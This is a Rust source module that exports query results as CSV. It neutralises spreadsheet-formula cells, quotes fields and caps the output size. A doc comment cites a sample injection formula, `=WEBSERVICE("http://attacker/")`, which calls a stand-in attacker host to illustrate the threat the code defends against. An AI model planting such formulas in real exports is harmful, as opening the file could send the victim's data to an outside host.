//! CSV export: formula neutralisation, field quoting, and encoding under
//! the export ceiling.

use saya_types::QueryResult;

use super::shared::{BoundedWriter, normalize_row};

fn cell_to_csv_string(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::Null => String::new(),
        serde_json::Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

/// Prefixes spreadsheet-formula-looking cells so opening the export in Excel
/// or LibreOffice cannot execute them (`=WEBSERVICE("http://attacker/")`).
/// Numeric values that merely start with `+`/`-` are left untouched.
pub(crate) fn neutralize_formula(field: &str) -> String {
    let trimmed = field.trim_start();
    let risky = match trimmed.chars().next() {
        Some('=') | Some('@') => true,
        Some('+') | Some('-') => trimmed[1..].trim().parse::<f64>().is_err(),
        _ => false,
    };
    if risky {
        format!("'{field}")
    } else {
        field.to_string()
    }
}

fn escape_csv_field(field: &str) -> String {
    if field.contains(',') || field.contains('"') || field.contains('\r') || field.contains('\n') {
        format!("\"{}\"", field.replace('"', "\"\""))
    } else {
        field.to_string()
    }
}

/// Encodes the result as CSV bytes — header line, one line per row, every
/// line newline-terminated — checking the ceiling while writing so an
/// oversize result stops early instead of materialising in full.
pub(super) fn encode_csv(result: &QueryResult, ceiling: usize) -> Result<Vec<u8>, String> {
    let col_count = result.columns.len();
    let mut out = BoundedWriter::new(ceiling);
    let header = result
        .columns
        .iter()
        .map(|c| escape_csv_field(&neutralize_formula(c)))
        .collect::<Vec<_>>()
        .join(",");
    out.write_str(&header)?;
    out.write_str("\n")?;
    for row in &result.rows {
        let cells = normalize_row(row, col_count);
        let line = cells
            .iter()
            .map(|cell| escape_csv_field(&neutralize_formula(&cell_to_csv_string(cell))))
            .collect::<Vec<_>>()
            .join(",");
        out.write_str(&line)?;
        out.write_str("\n")?;
    }
    Ok(out.into_inner())
}
